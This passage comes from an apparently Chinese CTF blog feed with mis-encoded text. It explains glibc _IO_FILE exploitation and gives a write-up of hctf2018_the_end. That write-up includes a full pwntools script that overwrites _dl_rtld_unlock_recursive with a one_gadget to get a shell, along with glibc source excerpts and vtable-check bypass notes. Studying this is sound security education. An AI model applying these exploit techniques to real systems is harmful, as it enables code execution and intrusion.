&lt;__GI__IO_file_doallocate&gt;,</span><br><span class="line">  __read = <span class="number">0x7ffff7a801b0</span> &lt;__GI__IO_file_read&gt;,</span><br><span class="line">  __write = <span class="number">0x7ffff7a7fb80</span> &lt;_IO_new_file_write&gt;,</span><br><span class="line">  __seek = <span class="number">0x7ffff7a7f980</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class="line">  __close = <span class="number">0x7ffff7a7f350</span> &lt;__GI__IO_file_close&gt;,</span><br><span class="line">  __stat = <span class="number">0x7ffff7a7fb70</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7a83b00</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7a83b10</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111906781.png" alt="image-20240611190216858"></p><h3 id="io-str-finishåˆ©ç”¨"><a href="#io-str-finishåˆ©ç”¨" class="headerlink" title="io_str_finishåˆ©ç”¨"></a>io_str_finishåˆ©ç”¨</h3><p>é€šè¿‡ä¿®æ”¹vtableæŒ‡é’ˆæŒ‡å‘&amp;_IO_str_jumps-8åï¼Œæˆ‘ä»¬æˆåŠŸè®¾ç½®äº†è·³è¡¨åç§»ï¼Œæˆ‘ä»¬åŸæœ¬è°ƒç”¨__overflowè¿™æ—¶ä¼šè°ƒç”¨__finish</p><p>strops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†_IO_str_finishï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è°ƒç”¨(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</p><p>æ‰€ä»¥éœ€è¦</p><ul><li>_IO_buf_base ä¸ä¸ºç©º   å¯ä»¥è®¾ç½®ä¸ºbin_sh_addr</li><li>!(fp-&gt;_flags &amp; _IO_USER_BUF)   #define _IO_USER_BUF 1   &#x3D;&#x3D;&gt;  _flagsä½ä½ä¸º0</li><li>_IO_write_base &lt; _IO_write_ptr   </li><li>_mode &lt;&#x3D; 0</li></ul><h3 id="IO-validate-vtable-åˆ©ç”¨"><a href="#IO-validate-vtable-åˆ©ç”¨" class="headerlink" title="IO_validate_vtable åˆ©ç”¨"></a>IO_validate_vtable åˆ©ç”¨</h3><p>2.24ä»¥ä¸Šé€šè¿‡IO_validate_vtableæ£€æŸ¥vtableæŒ‡å‘çš„åœ°å€æ˜¯å¦åˆæ³•</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111940498.png" alt="image-20240611194010402"></p><p>IO_validate_vtable åˆ©ç”¨ï¼šIO_validate_vtable â€“&gt; _IO_vtable_check â€“&gt; rtld_active () â€“&gt; _dl_addr â€“&gt; __rtld_lock_unlock_recursive (GL(dl_load_lock))</p><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è°ƒç”¨ __rtld_lock_unlock_recursive (GL(dl_load_lock))  é‚£ä¹ˆéœ€è¦rtld_active ()è¿”å›ä¸ºtrueï¼Œç„¶åä¼šè°ƒç”¨_dl_addr ä¸­çš„__rtld_lock_unlock_recursive </p><p>ç„¶åæ‰“exit hookç±»ä¼¼ã€‚</p><h1 id="ä¸€äº›è¯"><a href="#ä¸€äº›è¯" class="headerlink" title="ä¸€äº›è¯"></a>ä¸€äº›è¯</h1><p>ä½œä¸ºIO_FILEåŸºç¡€å…¥é—¨sky123å¸ˆå‚…å†™çš„åšå®¢æ˜¯æå¥½çš„</p><p>å‰©ä¸‹æ¥ä¸å †åˆ©ç”¨ç›¸ç»“åˆå°±ä¸å†™äº†</p><p>IOåˆ©ç”¨ä¼šè·Ÿå¤šçš„ä¸libcç‰ˆæœ¬ç›¸æŒ‚é’©ï¼Œä¹Ÿä¸å‡½æ•°çš„æ·±å±‚è°ƒç”¨æœ‰å¾ˆå¤§å…³ç³»ï¼Œé€šè¿‡å­¦ä¹ IO_FILEç»“æ„èƒ½æå¤§çš„å¸®åŠ©ç†è§£å‡½æ•°æ·±å±‚è°ƒç”¨çš„çº¦å®š</p><blockquote><p>ä¸€äº›å…³é”®çš„libcç‰ˆæœ¬è®°å½•ï¼š2.24å¢åŠ _IO_vtable_checkï¼›2.28  _IO_str_finish ä¸å†è°ƒç”¨ _free_buffer è€Œæ˜¯ç›´æ¥æ˜¯ç›´æ¥è°ƒç”¨ freeï¼›glibc-2.34 IO_validate_vtable åˆ©ç”¨å¤±æ•ˆï¼›è‡ª glibc-2.27 å¼€å§‹ï¼Œabort å‡½æ•°å‘ç”Ÿè¾ƒå¤§æ”¹åŠ¨ï¼Œä¸å†è°ƒç”¨ <code>_IO_flush_all_lockp</code> å‡½æ•°</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IO-FILEåˆ©ç”¨&quot;&gt;&lt;a href=&quot;#IO-FILEåˆ©ç”¨&quot; class=&quot;headerlink&quot; title=&quot;_IO_FILEåˆ©ç”¨&quot;&gt;&lt;/a&gt;_IO_FILEåˆ©ç”¨&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;sky123å¸ˆå‚…åšå®¢ï¼š&lt;a href=&quot;http://</summary>
      
    
    
    
    <category term="STU" scheme="http://tw11ty.github.io/categories/STU/"/>
    
    
    <category term="IO" scheme="http://tw11ty.github.io/tags/IO/"/>
    
  </entry>
  
  <entry>
    <title>the_end</title>
    <link href="http://tw11ty.github.io/2024/06/10/the-end/"/>
    <id>http://tw11ty.github.io/2024/06/10/the-end/</id>
    <published>2024-06-10T13:21:59.000Z</published>
    <updated>2024-11-16T08:37:50.362Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hctf2018-the-end"><a href="#hctf2018-the-end" class="headerlink" title="hctf2018_the_end"></a>hctf2018_the_end</h1><p>è¿œç¨‹ï¼š2.27-3ubuntu1</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091758971.png" alt="image-20240609175811827"></p><p>æ¯æ¬¡å¾€ä¸€ä¸ªåœ°å€é‡Œé¢å†™1å­—èŠ‚ï¼Œç»™äº†libc</p><h2 id="dl-rtld-unlock-recursive-dl-rtld-lock-recursive"><a href="#dl-rtld-unlock-recursive-dl-rtld-lock-recursive" class="headerlink" title="_dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive"></a>_dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive</h2><p>å¾€libcä¸­å†™å…¥æ•°æ®ï¼Œé€šè¿‡exité€€å‡ºï¼Œæ‰“exithookï¼Œç”¨one_gadgetæ¥è·å–shell</p><p>æˆ‘ä»¬åŠ«æŒldä¸­rtld_globalç»“æ„ä½“çš„_dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive</p><p>æœ€åæ‰“çš„æ˜¯_dl_rtld_unlock_recursive   _dl_rtld_lock_recursiveæ²¡é€š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;node5.buuoj.cn 28004&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./the_end&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    one_gadget = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>, <span class="number">0xe569f</span>, <span class="number">0xe5858</span>, <span class="number">0xe585f</span>, <span class="number">0xe5863</span>, <span class="number">0x10a398</span>]</span><br><span class="line">    one = libc_base + one_gadget[<span class="number">7</span>]</span><br><span class="line">    ori0 = one &amp; <span class="number">0xff</span></span><br><span class="line">    ori1 = one&gt;&gt;<span class="number">8</span> &amp; <span class="number">0xff</span></span><br><span class="line">    ori2 = one&gt;&gt;<span class="number">16</span> &amp; <span class="number">0xff</span></span><br><span class="line">    ori3 = one&gt;&gt;<span class="number">24</span> &amp; <span class="number">0xff</span></span><br><span class="line">    ori4 = one&gt;&gt;<span class="number">32</span> &amp; <span class="number">0xff</span></span><br><span class="line">    leak(<span class="string">&quot;one_gadget&quot;</span>, one)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori0))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori3))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori4))</span><br><span class="line"></span><br><span class="line">    IO_file_overflow = <span class="number">0x3e82b8</span> + libc_base</span><br><span class="line">    IO_file_underflow = <span class="number">0x3e82c0</span> + libc_base</span><br><span class="line">    dl_rtld_lock_recursive = <span class="number">0x619f60</span> + libc_base</span><br><span class="line">    dl_rtld_unlock_recursive  = <span class="number">0x619f68</span> + libc_base</span><br><span class="line">    leak(<span class="string">&quot;IO_file_overflow&quot;</span>, IO_file_overflow)</span><br><span class="line">    ru(<span class="string">b&#x27; good luck ;)\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">    s(p64(dl_rtld_unlock_recursive))</span><br><span class="line">    s(p8(ori0))</span><br><span class="line">    s(p64(dl_rtld_unlock_recursive+<span class="number">1</span>))</span><br><span class="line">    s(p8(ori1))</span><br><span class="line">    s(p64(dl_rtld_unlock_recursive+<span class="number">2</span>))</span><br><span class="line">    s(p8(ori2))</span><br><span class="line">    s(p64(dl_rtld_unlock_recursive+<span class="number">3</span>))</span><br><span class="line">    s(p8(ori3))</span><br><span class="line">    s(p64(dl_rtld_unlock_recursive+<span class="number">4</span>))</span><br><span class="line">    s(p8(ori4))</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="fini-array"><a href="#fini-array" class="headerlink" title="fini_array"></a>fini_array</h2><p>å¦‚æœæ²¡å¼€pieå’ŒRELROçš„è¯ç›´æ¥æ”¹fini_arrayä¸ºone_gadgetæ‰“äº†ï¼Œä¸è¿‡è¿™ç§é¢˜ç›®å¾ˆå°‘äº†</p><h2 id="IO-flush-all-lockp-IO-unbuffer-all"><a href="#IO-flush-all-lockp-IO-unbuffer-all" class="headerlink" title="_IO_flush_all_lockp&#x2F;  _IO_unbuffer_all ()"></a>_IO_flush_all_lockp&#x2F;  _IO_unbuffer_all ()</h2><p>æˆ‘ä»¬åˆ†æä¸€ä¸‹exitçš„è°ƒç”¨é“¾</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406101735021.png" alt="image-20240610173504887"></p><p>æ­£å¸¸è°ƒç”¨é“¾ï¼šexit â€“&gt; __run_exit_handlers  â€“&gt; _exit -&gt; INLINE_SYSCALL </p><p>åœ¨è°ƒç”¨__run_exit_handlers  æ—¶ï¼Œä¼šè§¦å‘   RUN_HOOK (__libc_atexit, ()); è°ƒç”¨libcé€€å‡ºæ—¶çš„ææ„å‡½æ•°__libc_atexitï¼Œä½äº__libc_atexitæ®µä¸Šï¼Œé‡Œé¢é»˜è®¤åªæœ‰ä¸€ä¸ªå‡½æ•°fcloseall()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__libc_atexit:00000000003E7738 ; ===========================================================================</span><br><span class="line">__libc_atexit:00000000003E7738</span><br><span class="line">__libc_atexit:00000000003E7738 ; Segment type: Pure data</span><br><span class="line">__libc_atexit:00000000003E7738 ; Segment permissions: Read/Write</span><br><span class="line">__libc_atexit:00000000003E7738 __libc_atexit   segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">__libc_atexit:00000000003E7738                 assume cs:__libc_atexit</span><br><span class="line">__libc_atexit:00000000003E7738                 ;org 3E7738h</span><br><span class="line">__libc_atexit:00000000003E7738 off_3E7738      dq offset fcloseall_0   ; DATA XREF: sub_42ED0+202â†‘o</span><br><span class="line">__libc_atexit:00000000003E7738                                         ; __libc_freeres+28â†‘o</span><br><span class="line">__libc_atexit:00000000003E7738 __libc_atexit   ends</span><br><span class="line">__libc_atexit:00000000003E7738</span><br></pre></td></tr></table></figure><p>fcloseall.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__fcloseall (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Close all streams.  */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_cleanup ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>genops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* åˆ·æ–°æ‰€æœ‰æµ */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* å…³é—­æ‰€æœ‰æµçš„ç¼“å†²åŒº */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)   <span class="comment">// --&gt; target</span></span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> legacy = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_vtable_offset (fp) != <span class="number">0</span>))</span><br><span class="line">legacy = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">  &amp;&amp; (legacy || fp-&gt;_mode != <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="comment">/* Give the other thread time to finish up its use of the</span></span><br><span class="line"><span class="comment"> stream.  */</span></span><br><span class="line">      __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (! legacy &amp;&amp; ! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">      freeres_list = fp;</span><br><span class="line">      fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);   <span class="comment">// --&gt; target</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (! legacy &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make sure that never again the wide char functions can be</span></span><br><span class="line"><span class="comment"> used.  */</span></span><br><span class="line">      <span class="keyword">if</span> (! legacy)</span><br><span class="line">fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨__IO_cleanupæ—¶ï¼Œå¯åˆ©ç”¨çš„å‡½æ•°æœ‰_IO_flush_all_lockpä¸_IO_unbuffer_all</p><p>å…¶ä¸­å¯ä»¥ä¼ªé€ _IO_flush_all_lockpä¸­çš„_IO_overflowï¼Œä¼ªé€ _IO_unbuffer_allä¸­çš„_IO_setbufk</p><p>é‚£ä¹ˆé¦–å…ˆæˆ‘ä»¬éœ€è¦ä¼ªé€ *vtableæŒ‡å‘ä¸€ä¸ªå¯å†™åœ°å€</p><p>ç”±äºlibcç‰ˆæœ¬&gt;2.24ï¼Œå­˜åœ¨_IO_vtable_check</p><p>_IO_vtable_check   libioP.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦ç»•è¿‡if (__glibc_unlikely (offset &gt;&#x3D; section_length))çš„checkï¼Œå°±éœ€è¦  ptr - __start___libc_IO_vtables &gt;&#x3D; __stop___libc_IO_vtables - __start___libc_IO_vtablesï¼Œå³ptrè¦åœ¨__start___libc_IO_vtablesåˆ°__stop___libc_IO_vtablesä¹‹é—´ï¼ˆè¯¥èŒƒå›´è¢«è®¾ç½®ä¸ºäº†ä¸å¯å†™ï¼‰</p><p>é‚£æˆ‘ä»¬å°è¯•æ‰“<strong>io_str_finish</strong></p><p>è°ƒç”¨é“¾å­ï¼š __run_exit_handlers  â€“&gt; __fcloseall  â€“&gt;  _IO_cleanup â€“&gt; _IO_flush_all_lockp â€“&gt; 